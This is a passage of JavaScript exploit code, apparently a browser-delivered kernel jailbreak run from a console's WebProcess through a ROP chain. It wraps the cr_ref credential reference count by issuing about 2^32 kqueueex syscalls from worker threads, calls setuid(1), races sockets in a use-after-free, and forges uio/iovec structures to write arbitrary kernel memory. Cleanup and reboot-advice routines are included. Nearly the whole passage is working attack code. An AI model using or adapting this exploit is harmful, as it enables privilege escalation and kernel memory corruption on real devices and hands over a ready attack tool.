      const prob = H.groupPrologueProblem(g, cores[0], TK.POOPS_RTPRIO);
      if (prob) note("burn prologue: " + prob);

      const burnDeadline =
        t0 + (o.burnDeadlineMs || (mode === "full" ? 3 * 3600 * 1000 : 60000));
      for (;;) {
        const active = [];
        for (let i = 0; i < PK.LEAK_CORES; ++i)
          if (queued[i] < want[i]) active.push(i);
        if (!active.length) break;
        if (Date.now() > burnDeadline) {
          out.why =
            "burn feed deadline with " +
            queued.join("/") +
            " of " +
            want.join("/") +
            " rounds queued";
          break;
        }
        armRet(active.length);
        await runBuilt("burn-feed", () => {
          for (let c = 0; c < active.length; ++c) {
            const i = active[c];
            emit(
              PSYS.WRITE,
              retPtr(c),
              S.burnPipes[i][1],
              feed.base,
              Math.min(4096, want[i] - queued[i]),
            );
          }
        });
        let progressed = 0;
        for (let c = 0; c < active.length; ++c) {
          const n = retOf(c);
          if (n > 0) {
            queued[active[c]] += n;
            progressed += n;
          }
        }
        if (!progressed) {
          await sleep(5);
          continue;
        }

        let doneRounds = 0;
        for (let i = 0; i < PK.LEAK_CORES; ++i)
          doneRounds += sync.get("finished", i);
        queueEvent(
          "BURN-PROGRESS",
          "queued=" +
            queued.join(".") +
            "-want=" +
            want.join(".") +
            "-rounds=" +
            doneRounds +
            "-ms=" +
            (Date.now() - t0),
        );
        await sleep(0);
      }

      const drainDeadline =
        Date.now() + (o.drainMs || (mode === "full" ? 3 * 3600 * 1000 : 30000));
      for (;;) {
        let behind = 0;
        for (let i = 0; i < PK.LEAK_CORES; ++i)
          if (sync.get("finished", i) < queued[i]) behind++;
        if (!behind) break;
        if (Date.now() > drainDeadline) {
          out.why =
            (out.why ? out.why + "; " : "") +
            behind +
            " burn worker(s) never drained their queue";
          break;
        }
        await sleep(20);
      }
    } finally {
      out.burnMs = Date.now() - t0;
      for (let i = 0; i < PK.LEAK_CORES; ++i) rounds += sync.get("finished", i);
      out.burnRounds = rounds;
      out.burnSyscalls = rounds * unroll;
      out.queued = queued.slice();
      S.kqueueexIssued += out.burnSyscalls;
      flushMark(
        "BURN",
        "mode=" +
          mode +
          "-rounds=" +
          rounds +
          "-perWorker=" +
          [0, 1, 2, 3]
            .slice(0, PK.LEAK_CORES)
            .map((i) => sync.get("finished", i))
            .join(".") +
          "-queued=" +
          queued.join(".") +
          "-want=" +
          want.join(".") +
          "-syscalls=" +
          out.burnSyscalls +
          "-ms=" +
          out.burnMs,
      );

      if (g) await terminateBurn(g, feed);
    }

    const after = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
    const fdAfter = after.failed ? -1 : after.s32;
    if (fdAfter >= 0) await sys(PSYS.CLOSE, fdAfter);
    out.fdDelta = fdBefore >= 0 && fdAfter >= 0 ? fdAfter - fdBefore : -1;
    if (out.burnSyscalls > 0)
      out.projectedMs = Math.round(
        (out.burnMs / out.burnSyscalls) * 4294967297,
      );
    flushMark(
      "BURN-DELTA",
      "fdDelta=" + out.fdDelta + "-projectedMsFor2^32=" + out.projectedMs,
    );

    if (mode !== "full") {
      out.ok = true;
      out.why =
        "calibration only: " +
        out.burnSyscalls +
        " kqueueex " +
        "in " +
        out.burnMs +
        " ms; fd delta " +
        out.fdDelta +
        "; budget 0x100000001 projects to " +
        (out.projectedMs > 0
          ? (out.projectedMs / 60000).toFixed(1) + " minutes"
          : "unknown");
      return out;
    }

    let tailIssued = 0;
    if (tailCalls > 0) {
      flushMark(
        "BURN-TAIL-PRE",
        "calls=" + tailCalls + "-from=driver-chain-rdi=0x800000000000",
      );
      for (let base = 0; base < tailCalls; base += 256) {
        const nb = Math.min(256, tailCalls - base);
        armRet(nb);
        await runBuilt("burn-tail", () => {
          for (let i = 0; i < nb; ++i) emit(PSYS.KQUEUEEX, retPtr(i), poc());
        });
        tailIssued += nb;
      }
      S.kqueueexIssued += tailIssued;
      flushMark("BURN-TAIL", "issued=" + tailIssued + "-of-" + tailCalls);
    }
    out.tailIssued = tailIssued;

    const leaked = rounds * unroll + tailIssued;
    out.leaked = leaked;
    const identity = leaked + freeFdsNum;
    flushMark(
      "BURN-IDENTITY",
      "leaked=" +
        leaked +
        "-pool=" +
        freeFdsNum +
        "-sum=" +
        identity +
        "-want=" +
        LEAK_SYSCALLS +
        "-ok=" +
        (identity === LEAK_SYSCALLS ? 1 : 0),
    );
    if (identity !== LEAK_SYSCALLS) {
      out.ok = false;
      out.why =
        "burn budget missed, no free-fd pool and no close(): " +
        leaked +
        " leaked + " +
        freeFdsNum +
        " planned must sum to " +
        LEAK_SYSCALLS +
        " (0x100000001), got " +
        identity +
        " (short by " +
        (LEAK_SYSCALLS - identity) +
        ")";
      return out;
    }

    S.freeFds = [];
    for (let base = 0; base < freeFdsNum; base += CH) {
      const nb = Math.min(CH, freeFdsNum - base);
      armRet(nb);
      await runBuilt("free-fd-pool", () => {
        for (let i = 0; i < nb; ++i) newFreeFd(src, i);
      });
      for (let i = 0; i < nb; ++i) {
        const fd = retOf(i);
        if (fd < 0) break;
        S.freeFds.push(fd);
        track(fd);
      }
    }
    S.freeFdIdx = 0;
    flushMark("FREE-FD-POOL", "n=" + S.freeFds.length + "-want=" + freeFdsNum);
    if (S.freeFds.length !== freeFdsNum) {
      out.ok = false;
      out.why =
        "free-fd pool short: " +
        S.freeFds.length +
        " of " +
        freeFdsNum +
        "; burn budgeted " +
        freeFdsNum +
        " crholds, cr_ref is R+1-" +
        (freeFdsNum - S.freeFds.length) +
        ", pool walk target " +
        "never established";
      return out;
    }

    S.crRefWrapped = true;
    await sys(PSYS.SETUID, 1);
    S.setuidCalls++;
    await sleepK(10000);
    out.ok = true;
    out.why =
      "burn " +
      leaked +
      " + pool " +
      freeFdsNum +
      " = 0x" +
      LEAK_SYSCALLS.toString(16) +
      " exactly; cr_ref is R+1, the " +
      "(R+1)-th pool close frees";
    return out;
  }

  async function terminateBurn(g, feed) {
    if (!g || g.jbBurnTerminated) return { already: true };
    g.jbBurnTerminated = true;
    const rep = {
      exited: 0,
      spawned: (g.spawned || []).length,
      timedOut: false,
      pipesClosed: 0,
    };
    try {
      for (const t of g.spawned)
        H.retargetSlot(
          t,
          t.jbMarks.pivotIdx,
          t.jbMarks.exitTail,
          "burn:" + t.jbName,
        );

      const fbuf = feed && feed.base ? feed : g.jbFeed || S.buf.scratchBig;
      if (S.burnPipes.length) {
        armRet(S.burnPipes.length);
        await runBuilt("burn-kick", () => {
          for (let i = 0; i < S.burnPipes.length; ++i)
            emit(PSYS.WRITE, retPtr(i), S.burnPipes[i][1], fbuf.base, 1);
        });
      }
      const waitExit = async (dlMs) => {
        const dl = Date.now() + dlMs;
        for (;;) {
          let n = 0;
          for (const t of g.spawned)
            if (g.S.get("cpu", t.jbWid) === PK.EXIT_MARK) n++;
          if (n === g.spawned.length) return n;
          if (Date.now() > dl) return n;
          await sleep(10);
        }
      };
      rep.exited = await waitExit(PK.EXIT_DEADLINE_MS);
      if (rep.exited !== g.spawned.length)
        flushMark(
          "BURN-EXIT-TIMEOUT",
          "exited=" +
            rep.exited +
            "-of-" +
            g.spawned.length +
            "-closing-the-pipes-to-force-EBADF",
        );
    } catch (err) {
      flushMark(
        "BURN-TERMINATE-FAILED",
        String((err && err.message) || err).slice(0, 100),
      );
    }

    try {
      if (S.burnPipes.length) {
        armRet(2 * S.burnPipes.length);
        await runBuilt("burn-pipe-close", () => {
          let c = 0;
          for (const [r, w] of S.burnPipes) {
            emit(PSYS.CLOSE, retPtr(c++), r);
            emit(PSYS.CLOSE, retPtr(c++), w);
          }
        });
        for (const [r, w] of S.burnPipes) {
          untrack(r);
          untrack(w);
        }
        rep.pipesClosed = 2 * S.burnPipes.length;
        S.burnPipes = [];
      }

      if (rep.exited !== g.spawned.length) {
        const dl = Date.now() + 3000;
        for (;;) {
          let n = 0;
          for (const t of g.spawned)
            if (g.S.get("cpu", t.jbWid) === PK.EXIT_MARK) n++;
          rep.exited = n;
          if (n === g.spawned.length || Date.now() > dl) break;
          await sleep(10);
        }
      }
    } catch (err) {
      flushMark(
        "BURN-PIPE-CLOSE-FAILED",
        String((err && err.message) || err).slice(0, 100),
      );
    }
    g.terminated = true;
    for (let i = 0; i < rep.exited; ++i) state.threadsExited++;
    rep.timedOut = rep.exited !== g.spawned.length;
    if (rep.timedOut)
      state.cleanupFailed =
        (state.cleanupFailed ? state.cleanupFailed + "  " : "") +
        "burn group: only " +
        rep.exited +
        " of " +
        g.spawned.length +
        " workers confirmed EXITED";
    flushMark(
      "BURN-TERMINATED",
      "workers=" +
        g.spawned.length +
        "-exited=" +
        rep.exited +
        "-pipesClosed=" +
        rep.pipesClosed,
    );
    return rep;
  }

  function pickBurnCores(driverCore) {
    const word = driver.origMaskBytes ? r32(driver.origMaskBytes, 0) : 0;
    const all = [];
    for (let i = 0; i < 16; ++i) if ((word >>> i) & 1) all.push(i);
    const others = all.filter((c) => c !== driverCore);

    const pick = (others.length ? others : all).slice(0, PK.LEAK_CORES);
    flushMark(
      "BURN-CORES",
      "mask=0x" +
        word.toString(16) +
        "-all=" +
        all.join(".") +
        "-driver=" +
        driverCore +
        "-picked=" +
        pick.join("."),
    );
    if (!pick.length) throw new Error("no core available for the burn workers");
    return pick;
  }

  async function unblockGroup(g, opts) {
    const o = opts || {};
    const maxRounds = o.rounds || 16;
    const deadline = Date.now() + (o.deadlineMs || 5000);
    const b = S.buf;

    if (!g.gen) {
      flushMark("UNBLOCK", g.name + "-skipped=never-signalled");
      return { rounds: 0, stillBlocked: 0, skipped: "never-signalled" };
    }
    let rounds = 0;
    for (; rounds < maxRounds; ++rounds) {
      let blocked = 0;
      for (const wid of g.wids) if (g.S.get("finished", wid) === 0) blocked++;
      if (!blocked) break;
      if (Date.now() > deadline) break;
      await runBuilt("unblock-" + g.name + "-" + rounds, () => {
        armRet(6);

        emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
        emit(PSYS.READ, retPtr(1), S.iovSockA, b.dummyByte.base, 1);

        emit(PSYS.READ, retPtr(2), S.uioSockA, b.scratchBig.base, 0x1000);
        emit(PSYS.READ, retPtr(3), S.uioSockA, b.scratchBig.base, 0x1000);

        emit(PSYS.WRITE, retPtr(4), S.uioSockB, b.scratchBig.base, 0x400);
        emit(PSYS.WRITE, retPtr(5), S.uioSockB, b.scratchBig.base, 0x400);
      });
      await sleep(2);
    }
    let stillBlocked = 0;
    for (const wid of g.wids)
      if (g.S.get("finished", wid) === 0) stillBlocked++;
    flushMark(
      "UNBLOCK",
      g.name +
        "-rounds=" +
        rounds +
        "-stillBlocked=" +
        stillBlocked +
        "-of-" +
        g.wids.length,
    );
    return { rounds, stillBlocked };
  }

  async function cleanup(opts) {
    const o = opts || {};
    const rep = {
      groups: [],
      socketpairs: "",
      teardown: null,
      kqClosed: 0,
      pipesClosed: 0,
      poolClosed: 0,
      uafLeft: "",
      restore: null,
      leftOpen: [],
      notes: [],
      burn: null,
      groupsLive: [],
    };

    const strand = (fd, why) => {
      if (fd === undefined || fd === null || fd < 0) return;
      S.doNotClose.add(fd);
      untrack(fd);
      rep.leftOpen.push(why + " fd=" + fd);
    };






    if (S.kernelWrites !== 0 || S.jailbroken) {
      const parkedGroups = [S.iovGroup, S.uioReadGroup, S.uioWriteGroup]
        .filter((g) => g && g.spawned && g.spawned.length)
        .map((g) => g.name);
      const parkedFds = Array.from(state.fdOpen).filter((fd) => fd >= 0);

      S.groupsStillLive = parkedGroups.slice();
      rep.groupsLive = parkedGroups.slice();
      for (const name of parkedGroups)
        rep.groups.push(name + ": parked intentionally after kernel writes");
      for (const fd of parkedFds) {
        S.doNotClose.add(fd);
        untrack(fd);
      }

      rep.socketpairs = "left open -- post-kernel teardown is disabled";
      rep.uafLeft = "left parked -- reboot required";
      rep.leftOpen.push(
        "post-kernel safety hold: " + parkedFds.length +
          " descriptor(s) left open until reboot",
      );
      rep.notes.push(
        "9.00 safety gate: racer termination and descriptor teardown skipped " +
          "after kernel writes; do not close or reload the page, reboot instead",
      );
      state.cleanupFailed =
        (state.cleanupFailed ? state.cleanupFailed + "  " : "") +
        "post-kernel state parked intentionally; reboot required";
      rep.doNotClose = Array.from(S.doNotClose);
      flushMark(
        "POOPS-CLEANUP-PARKED",
        "kernelWrites=" + S.kernelWrites +
          "-jailbroken=" + (S.jailbroken ? 1 : 0) +
          "-groups=" + (parkedGroups.join(".") || "none") +
          "-fds=" + parkedFds.length +
          "-action=reboot",
      );
      return rep;
    }

    for (const bg of S.burnThreads) {
      if (!bg || !bg.spawned || !bg.spawned.length) continue;
      try {
        const br = await terminateBurn(bg, bg.jbFeed);
        rep.burn = br;
        rep.groups.push(
          "burn: " +
            br.exited +
            "/" +
            br.spawned +
            " confirmed EXITED" +
            (br.timedOut ? " -- timed out" : ""),
        );
      } catch (err) {
        const m = String((err && err.message) || err).slice(0, 120);
        rep.groups.push("burn: could not terminate -- " + m);
        state.cleanupFailed =
          (state.cleanupFailed ? state.cleanupFailed + "  " : "") +
          "burn group left parked: " +
          m;
      }
    }

    for (const [r, w] of S.burnPipes) {
      strand(r, "burn pipe (read end, worker unconfirmed)");
      strand(w, "burn pipe (write end, worker unconfirmed)");
    }

    const liveNames = [];
    for (const g of [S.iovGroup, S.uioReadGroup, S.uioWriteGroup]) {
      if (!g || !g.spawned || !g.spawned.length) continue;
      let live = true,
        detail = "";
      try {
        const ub = await unblockGroup(g);
        rep.notes.push(
          g.name +
            " unblock: " +
            ub.rounds +
            " round(s), " +
            ub.stillBlocked +
            " racer(s) still not finished",
        );
        forceSettled(g, "cleanup");
        const r = await H.terminate(g, "cleanup");
        let notExited = 0;
        for (const t of g.spawned)
          if (g.S.get("status", t.jbWid) !== TK.ST_EXITED) notExited++;

        live = (r.exitedMs !== undefined && r.exitedMs < 0) || notExited > 0;
        detail =
          (r.already
            ? "already terminated"
            : "exited in " +
              r.exitedMs +
              " ms" +
              (r.exitedMs < 0 ? " (timed out)" : "")) +
          ", " +
          (g.spawned.length - notExited) +
          "/" +
          g.spawned.length +
          " status=ST_EXITED" +
          (ub.stillBlocked
            ? ", " + ub.stillBlocked + " still blocked in the work syscall"
            : "");
        rep.groups.push(g.name + ": " + detail);
      } catch (err) {
        detail =
          "could not terminate -- " +
          String((err && err.message) || err).slice(0, 120);
        rep.groups.push(g.name + ": " + detail);
        live = true;
      }
      if (live) {
        liveNames.push(g.name);
        state.cleanupFailed =
          (state.cleanupFailed ? state.cleanupFailed + "  " : "") +
          "racer group '" +
          g.name +
          "' is not confirmed exited: " +
          detail;
      }
    }
    S.groupsStillLive = liveNames.slice();
    rep.groupsLive = liveNames.slice();

    let gatesClosed = 0,
      gatesStranded = 0;
    for (const g of [S.iovGroup, S.uioReadGroup, S.uioWriteGroup]) {
      if (!g || !g.spawned) continue;
      const groupLive = liveNames.indexOf(g.name) >= 0;
      for (const t of g.spawned) {
        for (const which of ["jbWakeRfd", "jbWakeWfd"]) {
          const fd = t[which];
          if (typeof fd !== "number") continue;
          if (fd < 0) {
            gatesClosed++;
            continue;
          }

          strand(
            fd,
            "wake gate of " +
              t.jbName +
              (groupLive
                ? " (racer group still parked)"
                : " (terminate() could not close it)"),
          );
          gatesStranded++;
        }
      }
    }

    for (const g of [S.iovGroup, S.uioReadGroup, S.uioWriteGroup]) {
      if (!g || !g.jbGates) continue;
      for (const gt of g.jbGates) {
        const t = g.spawned.find((x) => x.jbWakeBuf === gt.buf);
        if (!t) continue;
        if (t.jbWakeRfd === -1) untrack(gt.rfd);
        if (t.jbWakeWfd === -1) untrack(gt.wfd);
      }
    }
    rep.wakeGates = "closed=" + gatesClosed + " stranded=" + gatesStranded;
    rep.notes.push("wake gates: " + rep.wakeGates);

    const pairFds = liveNames.length
      ? []
      : [S.uioSockB, S.uioSockA, S.iovSockB, S.iovSockA].filter(
          (fd) => fd >= 0,
        );
    if (liveNames.length) {
      rep.socketpairs =
        "left open -- " +
        liveNames.length +
        " racer group(s) not confirmed exited (" +
        liveNames.join(",") +
        ")";

      for (const fd of [S.iovSockA, S.iovSockB, S.uioSockA, S.uioSockB])
        strand(fd, "socketpair (racer group still parked)");
    }
    if (pairFds.length) {
      try {
        armRet(pairFds.length);
        await runBuilt("cleanup-close-pairs", () => {
          for (let i = 0; i < pairFds.length; ++i)
            emit(PSYS.CLOSE, retPtr(i), pairFds[i]);
        });
        let ok = 0;
        for (let i = 0; i < pairFds.length; ++i)
          if (retOf(i) === 0) {
            ok++;
            untrack(pairFds[i]);
          }
        rep.socketpairs = ok + "/" + pairFds.length + " closed";
      } catch (err) {
        rep.socketpairs =
          "close failed: " + String((err && err.message) || err).slice(0, 80);
      }
    }

    try {
      rep.teardown = await TW.teardown(o.teardown || {});
    } catch (err) {
      rep.teardown = {
        refused: false,
        error: String((err && err.message) || err).slice(0, 160),
      };
    }

    if (TW.S.fds && TW.S.fds.length) {
      for (const fd of TW.S.fds) {
        if (fd < 0 || S.doNotClose.has(fd)) continue;
        S.doNotClose.add(fd);
        untrack(fd);
      }
      rep.leftOpen.push(
        "IPv6 bank: " +
          TW.S.fds.length +
          " socket(s) " +
          "twin_lib kept (aliased or close() failed), not re-closed: " +
          "fds " +
          TW.S.fds.slice(0, 24).join(","),
      );
    }

    if (S.kqOpen.length) {
      try {
        const list = S.kqOpen.slice();
        armRet(list.length);
        await runBuilt("cleanup-close-kq", () => {
          for (let i = 0; i < list.length; ++i)
            emit(PSYS.CLOSE, retPtr(i), list[i]);
        });
        for (const fd of list) untrack(fd);
        rep.kqClosed = list.length;
        S.kqueuesClosed += list.length;
        S.kqOpen = [];
      } catch (err) {
        rep.notes.push("kqueue close failed");
      }
    }
    const pipes = [S.masterRfd, S.masterWfd, S.victimRfd, S.victimWfd].filter(
      (fd) => fd >= 0,
    );
    if (pipes.length && o.closePipes !== false) {
      try {
        armRet(pipes.length);
        await runBuilt("cleanup-close-pipes", () => {
          for (let i = 0; i < pipes.length; ++i)
            emit(PSYS.CLOSE, retPtr(i), pipes[i]);
        });
        for (const fd of pipes) untrack(fd);
        rep.pipesClosed = pipes.length;
      } catch (err) {
        rep.notes.push("pipe close failed");
      }
    }

    if (S.freeFds.length > S.freeFdIdx && S.crRefWrapped) {
      const tail = S.freeFds.slice(S.freeFdIdx);
      for (const fd of tail) strand(fd, "unspent free-fd pool entry");
      rep.notes.push(
        "unspent free-fd pool (" +
          tail.length +
          " fds " +
          "from index " +
          S.freeFdIdx +
          ") left open on purpose",
      );
    } else if (S.freeFds.length > S.freeFdIdx) {
      const tail = S.freeFds.slice(S.freeFdIdx);
      try {
        for (let base = 0; base < tail.length; base += 128) {
          const nb = Math.min(128, tail.length - base);
          armRet(nb);
          await runBuilt("cleanup-close-pool", () => {
            for (let i = 0; i < nb; ++i)
              emit(PSYS.CLOSE, retPtr(i), tail[base + i]);
          });
          for (let i = 0; i < nb; ++i) untrack(tail[base + i]);
        }
        rep.poolClosed = tail.length;
      } catch (err) {
        rep.notes.push("pool close failed");
      }
      rep.notes.push(
        "closed free_fds[" +
          S.freeFdIdx +
          ".." +
          S.freeFds.length +
          "); " +
          S.freeFdIdx +
          " already spent",
      );
    }

    if (S.uafSock >= 0 && !S.uafClosed) {
      if (!TW.corrupt) {
        await sys(PSYS.CLOSE, S.uafSock);
        untrack(S.uafSock);
        S.uafClosed = true;
        rep.uafLeft = S.triggered
          ? "closed once, pre-LINE-B (lua:665)"
          : "closed (no trigger fired)";
        S.uafSock = -1;
      } else {
        rep.uafLeft = "left open deliberately";
        strand(S.uafSock, "uaf_socket (an alias exists)");
      }
    } else if (S.uafClosed) {
      rep.uafLeft = "already closed by an earlier cleanup";
    }

    for (const fd of S.uafSocks)
      if (fd >= 0 && fd !== S.uafSock && !S.doNotClose.has(fd))
        strand(fd, "uaf_socket from an earlier attempt");

    rep.restoreNeeded = !!(
      driver &&
      (driver.prioChanged || driver.affChanged || driver.pinned)
    );
    if (driver) {
      const captured = !!driver.origMaskBytes && driver.origPrioType >= 0;
      if (captured) {
        rep.restore = await H.restoreDriver("poops-cleanup");
        if (
          rep.restoreNeeded &&
          rep.restore &&
          (!rep.restore.affOk || !rep.restore.prioOk)
        )
          state.cleanupFailed =
            (state.cleanupFailed ? state.cleanupFailed + "  " : "") +
            "scheduler restore did not read back: affinity " +
            (rep.restore.affOk
              ? "ok"
              : "FAILED (saw " + rep.restore.affSeen + ")") +
            ", priority " +
            (rep.restore.prioOk
              ? "ok"
              : "FAILED (saw " + rep.restore.prioSeen + ")");
      } else if (rep.restoreNeeded) {
        rep.notes.push(
          "driver scheduler state changed, original " +
            "never captured, no restore possible from this " +
            "page",
        );
        state.cleanupFailed =
          (state.cleanupFailed ? state.cleanupFailed + "  " : "") +
          "driver scheduler state changed, no " +
          "captured baseline to restore";
      } else {
        rep.notes.push(
          "no scheduler change to restore: priority " +
            "and affinity were never written",
        );
      }
    }
    rep.doNotClose = Array.from(S.doNotClose);
    flushMark(
      "POOPS-CLEANUP",
      "groups=" +
        rep.groups.length +
        "-live=" +
        (rep.groupsLive.join(".") || "none") +
        "-pairs=" +
        rep.socketpairs +
        "-kq=" +
        rep.kqClosed +
        "-pipes=" +
        rep.pipesClosed +
        "-pool=" +
        rep.poolClosed +
        "-doNotClose=" +
        rep.doNotClose.length +
        "-teardown=" +
        (rep.teardown
          ? rep.teardown.refused
            ? "REFUSED"
            : "freed" + rep.teardown.freed + "/closed" + rep.teardown.closed
          : "none"),
    );
    return rep;
  }

  let cleanupRun = null,
    cleanupResult = null;
  async function cleanupOnce(opts) {
    if (cleanupResult) {
      flushMark("POOPS-CLEANUP-REENTRY", "already-completed");
      return Object.assign({}, cleanupResult, { reentry: true });
    }
    if (cleanupRun) {
      flushMark("POOPS-CLEANUP-REENTRY", "concurrent-call-joined-the-first");
      return cleanupRun;
    }
    cleanupRun = cleanup(opts || {});
    try {
      const r = await cleanupRun;
      cleanupResult = r;
      return r;
    } catch (err) {
      cleanupRun = null;
      throw err;
    }
  }

  function verdict(extra) {
    const e = extra || {};
    const reasons = [];

    if (S.triggered && !S.aliasesRepaired)
      reasons.push("the trigger fired (" + S.triggered.slice(0, 120) + ")");
    if (TW.corrupt)
      reasons.push("an alias was observed (" + TW.corrupt.slice(0, 120) + ")");

    if (TW.tripletsValid() && !S.aliasesRepaired)
      reasons.push("stage 0 succeeded -- three sockets share one " + "chunk");
    if (e.teardownRefused) reasons.push("bank teardown refused");
    if (e.teardownIncomplete) reasons.push("bank teardown incomplete");
    if (e.chainDead)
      reasons.push(
        "the rop chain died" +
          (S.triggered ? " after the trigger fired" : "") +
          " -- nothing was put back",
      );
    if (e.restoreMissing)
      reasons.push("the driver's scheduler state was never restored");
    if (e.affRestoreFailed)
      reasons.push(
        "driver affinity did not read back after the " +
          "restore, may still be pinned to one core",
      );
    if (e.prioRestoreFailed)
      reasons.push(
        "driver priority did not read back after the " +
          "restore, may still be at PRI_REALTIME/" +
          TK.POOPS_RTPRIO,
      );
    if (e.cleanupFailed)
      reasons.push(
        "cleanup did not complete: " + String(e.cleanupFailed).slice(0, 160),
      );
    if (S.groupsStillLive.length)
      reasons.push(
        "racer group(s) not confirmed exited: " + S.groupsStillLive.join(", "),
      );

    if (e.strandedCount && !S.aliasesRepaired)
      reasons.push(
        e.strandedCount +
          " descriptor(s) left open " +
          "deliberately, still held by this WebProcess",
      );
    if (S.kreadCalls > 0 && e.uioParked)
      reasons.push("uio built, not every uio worker confirmed " + "returned");

    if (e.repairExhausted && !S.aliasesRepaired)
      reasons.push(
        "triplet member lost, " + "repairTriplets exhausted its budget",
      );

    if (S.setuidCalls > 0 && !S.aliasesRepaired)
      reasons.push(
        "setuid(1) called " +
          S.setuidCalls +
          " time(s), " +
          "irreversible until reboot",
      );
    if (S.crRefWrapped)
      reasons.push(
        "cr_ref wrapped by the full burn: below the number " +
          "of files holding the credential",
      );
    if (reasons.length)
      return {
        reboot: true,
        text: "reboot now -- " + reasons[0],
        all: reasons,
      };
    return {
      reboot: false,
      text: "clean -- nothing triggered, everything put " + "back",
      all: [],

      verified: {
        teardown: !!e.teardownRan,
        racers: !S.groupsStillLive.length,
        schedAff: !!e.affRestored,
        schedPrio: !!e.prioRestored,
        kernelWrites: S.kernelWrites,
      },
    };
  }

  async function kwriteSlow(kaddr, srcU8, size, opts) {
    const o = opts || {};
    const b = S.buf;
    const out = { ok: false, why: "", loopA: -1, loopB: -1 };

    if (!TW.tripletsValid()) {
      out.why = "triplets invalid on entry";
      return out;
    }
    if (!isKernelPtr(kaddr)) {
      out.why = "refusing to kwrite to non-canonical " + hx(kaddr);
      return out;
    }
    flushMark(
      "KWRITE-PRE",
      "kaddr=" +
        hx(kaddr) +
        "-size=" +
        size +
        "-triplets=" +
        TW.S.triplets.join(".") +
        "-THIS-WRITES-TO-KERNEL-MEMORY",
    );
    flushQueueSoft();

    w32(b.sndbuf.u8, 0, size * PK.UIO_THREAD_NUM);
    w64(b.uioIovWrite.u8, 0x08, size);
    await runBuilt("kwrite-pre", () => {
      armRet(1);
      emit(
        PSYS.SETSOCKOPT,
        retPtr(0),
        S.uioSockB,
        K.SOL_SOCKET,
        K.SO_SNDBUF,
        b.sndbuf.base,
        4,
      );
    });

    for (let i = 0; i < size; ++i) b.uioWriteBuf.u8[i] = srcU8[i];

    await runBuilt("kwrite-free-t1", () => {
      armRet(3);
      emitFreeRthdr(TW.S.triplets[1], 0);
      emit(PSYS.SCHED_YIELD, retPtr(1));
      emit(PSYS.SCHED_YIELD, retPtr(2));
    });

    let found = false,
      itA = 0;
    const deadA = Date.now() + (o.loopDeadlineMs || 30000);
    for (; itA < PK.RECLAIM_ROUNDS; ++itA) {
      if (Date.now() > deadA) break;
      await H.signal(S.uioWriteGroup, PK.SIGNAL_DEADLINE_MS, "kwriteA:" + itA);
      w32(b.lenOut.u8, 0, 16);
      for (let z = 0; z < 16; ++z) b.readback.u8[z] = 0xee;
      await runBuilt("kwriteA-probe", () => {
        armRet(2);
        emit(PSYS.SCHED_YIELD, retPtr(0));
        emitGetRthdr(TW.S.triplets[0], b.readback.base, b.lenOut.base, 1);
      });
      if (
        retOf(1) === 0 &&
        r32(b.readback.u8, PK.OFF.UIO_IOVCNT) === PK.UIO_IOV_COUNT
      ) {
        found = true;
        break;
      }
      await runBuilt("kwriteA-drain", () => {
        armRet(PK.UIO_THREAD_NUM);
        for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
          emit(PSYS.WRITE, retPtr(i), S.uioSockB, b.uioWriteBuf.base, size);
      });
      await H.waitFinished(
        S.uioWriteGroup,
        PK.WAIT_DEADLINE_MS,
        "kwriteA:" + itA,
      );
    }
    out.loopA = itA;
    if (!found) {
      out.why =
        "kwrite loop A exhausted " +
        itA +
        " rounds: no writev " +
        "uio in the freed chunk";
      forceSettled(S.uioWriteGroup, "kwriteA-exhausted");
      await releaseUioWriteAndSettle("kwriteA-exhausted", size);
      return out;
    }

    const leaked = r64(b.readback.u8, PK.OFF.UIO_IOV);
    if (isZero64(leaked) || !isKernelPtr(leaked)) {
      out.why = "kwrite leaked_iov " + hx(leaked) + " is not canonical";
      await releaseUioWriteAndSettle("kwriteA-bad-iov", size);
      return out;
    }

    if (
      S.leakedIovFirst &&
      (S.leakedIovFirst.low !== leaked.low || S.leakedIovFirst.hi !== leaked.hi)
    ) {
      out.why =
        "kwrite leaked_iov changed: was " +
        hx(S.leakedIovFirst) +
        ", now " +
        hx(leaked) +
        ", refusing to write";
      flushMark("KWRITE-IOV-CHANGED", out.why.slice(0, 150));
      await releaseUioWriteAndSettle("kwrite-iov-changed", size);
      return out;
    }

    buildUio(b.iovecs, leaked, 0, false, kaddr, size);

    await runBuilt("kwrite-mid", () => {
      armRet(4);
      emitFreeRthdr(TW.S.triplets[2], 0);
      emit(PSYS.SCHED_YIELD, retPtr(1));
      emit(PSYS.SCHED_YIELD, retPtr(2));
      emit(PSYS.SCHED_YIELD, retPtr(3));
    });

    found = false;
    let itB = 0;
    const deadB = Date.now() + (o.loopDeadlineMs || 30000);
    for (; itB < PK.RECLAIM_ROUNDS; ++itB) {
      if (Date.now() > deadB) break;
      await H.signal(S.iovGroup, PK.SIGNAL_DEADLINE_MS, "kwriteB:" + itB);
      w32(b.lenOut.u8, 0, 64);
      for (let z = 0; z < 64; ++z) b.readback.u8[z] = 0xee;
      await runBuilt("kwriteB-probe", () => {
        armRet(6);
        for (let y = 0; y < 5; ++y) emit(PSYS.SCHED_YIELD, retPtr(y));
        emitGetRthdr(TW.S.triplets[0], b.readback.base, b.lenOut.base, 5);
      });
      if (
        retOf(5) === 0 &&
        r32(b.readback.u8, PK.OFF.UIO_SEGFLG) === PK.UIO_SYSSPACE
      ) {
        found = true;
        break;
      }
      await runBuilt("kwriteB-drain-w", () => {
        armRet(1);
        emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
      });
      await H.waitFinished(S.iovGroup, PK.WAIT_DEADLINE_MS, "kwriteB:" + itB);
      await readReleaseByte("kwriteB-drain-r");
    }
    out.loopB = itB;
    if (!found) {
      out.why =
        "kwrite loop B exhausted " +
        itB +
        " rounds: forged " +
        "uio never landed (outLen/segflg as kread)";
      forceSettled(S.iovGroup, "kwriteB-exhausted");
      await releaseIovAndSettle("kwriteB-exhausted");
      await releaseUioWriteAndSettle("kwriteB-exhausted", size);
      return out;
    }

    await runBuilt("kwrite-commit", () => {
      armRet(PK.UIO_THREAD_NUM);
      for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
        emit(PSYS.WRITE, retPtr(i), S.uioSockB, b.uioWriteBuf.base, size);
    });
    S.kernelWrites++;

    const t1 = await TW.findTriplet(TW.S.triplets[0], -1, {
      attempts: PK.FIND_TRIPLET_FAST,
      deadlineMs: o.repairDeadlineMs || 20000,
    });
